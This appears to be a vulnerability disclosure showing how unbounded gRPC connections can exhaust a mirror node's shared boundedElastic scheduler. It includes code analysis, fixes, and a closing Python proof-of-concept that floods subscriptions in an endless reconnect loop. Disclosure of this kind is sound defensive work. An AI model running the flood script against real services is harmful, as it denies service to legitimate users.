### Title
Unbounded gRPC Connections Allow Exhaustion of Global `boundedElastic()` Scheduler via Concurrent `retrieve()` Subscriptions

### Summary
`PollingTopicMessageRetriever.retrieve()` schedules all polling and timeout operations on the JVM-global `Schedulers.boundedElastic()` instance. Because there is no limit on the number of inbound gRPC connections and `maxConcurrentCallsPerConnection` is only 5 per connection, an unprivileged attacker can open an arbitrary number of connections and saturate the shared scheduler thread pool. Since every other reactive pipeline in the gRPC service (safety-check, listeners, network service) also uses the same global scheduler, exhaustion causes total gRPC service unavailability.

### Finding Description

**Exact code locations:**

`PollingTopicMessageRetriever` constructor (line 41) calls `Schedulers.boundedElastic()`, which returns the **global** shared scheduler — not a private instance: [1](#0-0) 

That same global scheduler is used for both the repeat-delay scheduling and the timeout in every `retrieve()` call: [2](#0-1) 

For the throttled path (`throttled=true`), `numRepeats` is set to `Long.MAX_VALUE`, meaning the retriever polls indefinitely until `isComplete()` returns true or the 60-second timeout fires: [3](#0-2) 

`isComplete()` for the throttled path only returns `true` when the last page was smaller than `maxPageSize` (1000) or the limit is hit: [4](#0-3) 

For a topic with a large or continuously growing message history, the retriever will keep polling every 2 seconds for the full 60-second timeout window, holding scheduler threads for each poll execution.

The same global `boundedElastic()` scheduler is also used by `TopicMessageServiceImpl`'s safety-check path: [5](#0-4) 

**Connection limit analysis:**

`GrpcConfiguration` sets only `maxConcurrentCallsPerConnection`: [6](#0-5) 

`NettyProperties` defaults this to 5: [7](#0-6) 

There is no `maxConnections` call anywhere in `GrpcConfiguration`. An attacker opening N TCP connections gets 5N concurrent streaming RPCs, each invoking `retrieve()` and consuming threads from the global `boundedElastic()` pool.

**Root cause:** `Schedulers.boundedElastic()` is a global singleton bounded to `10 × availableProcessors()` threads (e.g., 80 threads on an 8-core host). No per-subscriber or global subscription count cap exists. The `subscriberCount` field in `TopicMessageServiceImpl` is a metrics gauge only — it enforces nothing: [8](#0-7) 

### Impact Explanation

When the global `boundedElastic()` pool is saturated, every component sharing it stalls: the safety-check `Mono.delay`, `PollingTopicListener`, `SharedPollingTopicListener`, `SharedTopicListener`, and `NetworkServiceImpl` all block waiting for a scheduler thread. New legitimate subscriptions time out before their first poll executes. The gRPC service becomes completely unresponsive — matching the "total network shutdown" severity tier — because the mirror node can no longer relay topic messages or respond to network service queries.

### Likelihood Explanation

No authentication is required for gRPC topic subscriptions. The attacker needs only a standard gRPC client library and the ability to open many TCP connections (trivially done from a single machine or a small botnet). The attack is repeatable: after the 60-second timeout clears one wave of subscriptions, the attacker immediately reconnects. The continuous reconnect loop keeps the scheduler saturated indefinitely with minimal bandwidth cost (the subscription request payload is tiny).

### Recommendation

1. **Enforce a global connection limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionAge` / `maxConnections` or an equivalent Netty channel option.
2. **Cap total active subscriptions** using a semaphore or `AtomicLong` counter checked before entering `retrieve()`, returning an `RESOURCE_EXHAUSTED` gRPC status when the cap is exceeded.
3. **Use a private, size-limited scheduler** in `PollingTopicMessageRetriever` instead of the global `Schedulers.boundedElastic()`, so retriever exhaustion cannot starve other reactive pipelines:
   ```java
   scheduler = Schedulers.newBoundedElastic(MAX_RETRIEVER_THREADS, MAX_QUEUE, "retriever");
   ```
4. **Reduce the default timeout** (`retrieverProperties.getTimeout()`) or add per-IP rate limiting at the load-balancer layer to limit reconnect storms.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# consensus_service_pb2 / stub generated from the mirror node proto
import consensus_service_pb2_grpc as cs_grpc
import consensus_service_pb2 as cs

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 200   # 200 connections × 5 calls = 1000 concurrent subscriptions
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = cs_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(CALLS_PER_CONN):
        req = cs.ConsensusTopicQuery(
            topicID=cs.TopicID(topicNum=1),  # any existing topic with history
            # no limit, no endTime → throttled retriever loops for 60 s
        )
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    while True:   # continuous reconnect keeps scheduler saturated
        list(pool.map(flood, range(NUM_CONNECTIONS)))
```

After a few seconds, legitimate clients receive `DEADLINE_EXCEEDED` or hang indefinitely because the global `boundedElastic()` pool is fully occupied by attacker poll tasks and cannot schedule timeout or safety-check work for real subscribers.
